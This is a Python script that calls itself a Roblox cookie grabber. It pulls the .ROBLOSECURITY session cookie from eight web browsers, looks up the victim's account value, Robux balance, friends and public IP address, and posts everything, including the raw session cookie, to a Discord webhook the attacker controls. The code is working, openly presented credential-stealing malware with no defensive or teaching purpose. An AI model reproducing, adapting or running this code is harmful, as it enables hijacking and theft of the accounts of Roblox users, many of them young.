webhook = ""

try:
    import robloxpy
    import requests
    from discordwebhook import * ## I will likely expunge discordwebhook from here in V2.1
    import browser_cookie3

except:
    input("One of the packages are not installed, run 'install.bat' before using this.")
    exit()





def cookiecheckerandsend(cookie, platform):

    ## In the original version, from Mani175, he did not account for the fact there could be multiple cookies, and only accessed the value once.
    ## In this, it will grab *all* cookies from the platforms that are specified to run this function. Modify them however you see fit.

    if not robloxpy.Utils.CheckCookie(cookie) == "Valid Cookie":
        return requests.post(url=webhook, data={"content":f"Dead Cookie\n|| ```{cookie}``` ||"})

    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()
    rid = info["UserID"]
    username = info['UserName']
    robux = info['RobuxBalance']
    premium = info['IsPremium']
    rap = robloxpy.User.External.GetRAP(rid)
    friends = robloxpy.User.Friends.External.GetCount(rid)
    age = robloxpy.User.External.GetAge(rid)
    crdate = robloxpy.User.External.CreationDate(rid)

    discord = Discord(url=webhook)
    discord.post(
    username="ꜱᴏᴍᴇᴛʜɪɴɢ's Roblox Cookie Grabber",
    avatar_url="https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
    embeds=[
        {
            "title": f"🕯 Valid Account - {platform}",
            "description" : f"[Github Page](https://github.com/something23-0001/-s-Cookie-Grabber) | [Rolimons](https://www.rolimons.com/player/{rid}) | [Roblox Profile](https://web.roblox.com/users/{rid}/profile)",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux", "value": robux, "inline": True},
                {"name": "Premium", "value": premium,"inline": True},
                {"name": "Date of Creation", "value": crdate, "inline": True},
                {"name": "RAP", "value": rap,"inline": True},
                {"name": "Friends", "value": friends, "inline": True},
                {"name": "Age", "value": f"{age} Days ; {int(age)/365:.2f} Years", "inline": True},
                {"name": "IP Address", "value": requests.get("https://api.ipify.org/").text, "inline:": True},
                {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
            ],
            "footer": {
                "text": "V2 | Forked from Mani175's Pirate-Cookie-Grabber"
            }
        }
    ],
)


def cookieLogger():

    
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Firefox')
    except:
        pass

    try:
        cookies = browser_cookie3.safari(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Safari')
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chromium')
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
    except:
        pass

    try:
        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera GX')
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Opera')
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Brave')
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                cookiecheckerandsend(cookie.value, platform='Chrome')
    except:
        pass

cookies = cookieLogger()
